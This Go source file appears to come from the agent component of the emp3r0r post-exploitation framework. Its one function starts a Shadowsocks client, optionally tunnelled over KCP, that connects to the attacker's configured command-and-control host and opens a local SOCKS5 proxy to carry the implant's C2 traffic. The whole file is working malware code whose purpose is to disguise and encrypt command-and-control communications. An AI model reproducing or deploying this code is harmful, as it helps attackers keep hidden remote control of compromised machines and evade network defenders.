package agent

import (
	"fmt"
	"log"

	"github.com/jm33-m0/emp3r0r/core/lib/ss"
)

// Start ShadowsocksC2Client client, you get a SOCKS5 proxy server at *:Runtime.ShadowsocksPort
// This proxy server is responsible for encapsulating C2 traffic
func ShadowsocksC2Client() {
	ss_server_port := RuntimeConfig.ShadowsocksPort
	if RuntimeConfig.UseKCP {
		go KCPClient()
		log.Print("C2 traffic will go through Shadowsocks, which will go through KCP")
		ss_server_port = RuntimeConfig.KCPPort
	} else {
		log.Printf("C2 traffic will go through Shadowsocks: %s:%s",
			RuntimeConfig.CCHost,
			RuntimeConfig.ShadowsocksPort)
	}

	server_addr := fmt.Sprintf("%s:%s", RuntimeConfig.CCHost, ss_server_port)
	local_socks_addr := "127.0.0.1:" + RuntimeConfig.ShadowsocksPort

	// start ss
	err := ss.SSMain(server_addr, local_socks_addr, ss.AEADCipher,
		RuntimeConfig.ShadowsocksPassword, false, false)
	if err != nil {
		log.Fatalf("ShadowsocksProxy failed to start: %v", err)
	}
}
